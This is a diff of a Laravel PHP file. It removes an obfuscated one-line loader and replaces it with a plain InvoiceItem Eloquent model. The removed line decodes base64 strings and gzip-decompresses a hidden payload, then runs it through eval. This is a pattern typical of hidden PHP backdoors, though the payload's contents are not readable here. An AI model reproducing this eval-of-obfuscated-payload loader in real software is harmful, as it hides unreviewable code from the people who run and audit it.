@@ -1,1 +1,24 @@
-<?php $_='cd3dc693';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNplUkuPokAQvu+v4DAJmuyhUdxZYzyICtru4AojDX0xdDeCCkgWH8iv31LRwUwnRRf1+Oqr6pKk+3lbfZ2+jFRf5QpX5d7b3ZD926SHtdz7IdXi+5LsKt0TI07qLfp9WfpyP/D6oMo8cZBw8XE61GKR6PlsaK1d5Xc2P1+TpFfQlSTdkpifB7/UlQj4XgRy7xvF0WJvDpNOBNVLbuhbamsan2j8k3R3lBTl/Ixmo0Wm8NYytEmRC6JkLNERdYqx51qRl+gl6DozuoUgzlHoheERE7E2zqhrctvQSyvRt8LoXoLP3BymTgk1MDMKhZH4CBixO7YiYegbzzVBd3LW1hVKOsgdKydqOHnFYcsAi18gN6Unn5ixDbnM1uJgAndildMqHmLfoa9wOhyEAjCn4yjiiEZe2zrxdPd+63kzAL925kkXUeBLySLEBs2AF/RUxNMRCgnUvWJUkkLfB2rz/IF9F7GjMAcfZoUv5wr3LriNoa9l+mfwisNdJ2KplYnJ7rtvgjOvVcvR0QtfQXDuk4+Qps4R+slYSw190mmxVgxvF2YPbsELd+0CHBWeqCGeWHvf/Tj8TXAMb3akbXPJLtFzpvPtY8675wzXCzS7Sm1va6t5uxvVX/O26TVbs/eIvBkb8vUr/3yGvy5thdOo72iz2fsP2IwLig=='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Models;
+
+use Illuminate\Database\Eloquent\Factories\HasFactory;
+use Illuminate\Database\Eloquent\Model;
+
+class InvoiceItem extends Model
+{
+    use HasFactory;
+
+    protected $fillable = [
+        'name',
+        'details',
+        'rate',
+        'quantity',
+        'price',
+    ];
+
+    public function invoice()
+    {
+        return $this->belongsTo(Invoice::class);
+    }
+}
